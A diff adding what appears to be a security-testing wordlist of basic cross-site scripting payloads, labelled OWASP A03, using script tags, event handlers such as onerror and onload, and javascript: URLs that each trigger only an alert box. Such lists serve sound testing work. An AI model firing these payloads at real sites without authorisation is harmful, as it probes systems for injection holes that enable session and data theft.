@@ -1,0 +1,17 @@
+# Payloads XSS - OWASP A03
+# Reflected / stored XSS basiques
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<a href="javascript:alert('XSS')">click</a>
+"><img src=x onerror=alert(1)>
+'"><img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+javascript:alert('XSS')
